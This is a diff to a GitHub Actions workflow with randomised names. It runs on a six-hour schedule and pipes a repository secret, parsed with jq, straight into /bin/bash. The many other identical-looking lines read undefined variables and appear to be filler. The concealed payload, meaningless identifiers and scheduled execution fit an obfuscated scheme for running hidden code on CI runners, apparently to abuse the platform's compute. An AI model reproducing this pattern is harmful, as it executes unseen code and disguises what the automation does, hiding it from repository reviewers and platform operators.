@@ -1,32 +1,34 @@
 name: meiwucan8563
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 2/6 * * *'
+    - cron: '6 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: meiwucan8563
         env:
-          vcr3: ${{ secrets.vcr3 }}
+          lg34: ${{ secrets.lg34 }}
         run: |
-          echo $vcr3 | jq -r .jvdwm72952 | /bin/bash
-          echo $q6 | jq -r .lv50 | /bin/bash
-          echo $qb19405 | jq -r .icwae106 | /bin/bash
-          echo $hkl0 | jq -r .lns155 | /bin/bash
-          echo $eq486 | jq -r .vu26581 | /bin/bash
-          echo $a1 | jq -r .phdo8 | /bin/bash
-          echo $jevu54 | jq -r .wwb5484 | /bin/bash
-          echo $iaize75 | jq -r .vg907 | /bin/bash
-          echo $c9847 | jq -r .wjfh58206 | /bin/bash
-          echo $rtt6 | jq -r .txm6201 | /bin/bash
-          echo $p42 | jq -r .sx69620 | /bin/bash
-          echo $cbtik700 | jq -r .bie59 | /bin/bash
-          echo $h0 | jq -r .opezn8 | /bin/bash
-          echo $rp44742 | jq -r .zls3 | /bin/bash
-          echo $pbxs80 | jq -r .fnmog24336 | /bin/bash
-          echo $vph4772 | jq -r .kef3 | /bin/bash
+          echo $lg34 | jq -r .h52 | /bin/bash
+          echo $nse2 | jq -r .v9 | /bin/bash
+          echo $k8 | jq -r .rxj7 | /bin/bash
+          echo $n92 | jq -r .ked6 | /bin/bash
+          echo $zyt0626 | jq -r .jg5 | /bin/bash
+          echo $y35827 | jq -r .t06437 | /bin/bash
+          echo $ilie790 | jq -r .zwc1611 | /bin/bash
+          echo $ub750 | jq -r .er98654 | /bin/bash
+          echo $rpp00 | jq -r .h27 | /bin/bash
+          echo $hfo9 | jq -r .lf89 | /bin/bash
+          echo $kkftb7 | jq -r .juubb55237 | /bin/bash
+          echo $rf86044 | jq -r .gskz189 | /bin/bash
+          echo $liz358 | jq -r .ashus6 | /bin/bash
+          echo $vw232 | jq -r .g0377 | /bin/bash
+          echo $h624 | jq -r .h44369 | /bin/bash
+          echo $tvj6 | jq -r .htsrs35159 | /bin/bash
+          echo $kkf3 | jq -r .eecej812 | /bin/bash
+          echo $qt49221 | jq -r .ge3388 | /bin/bash
 
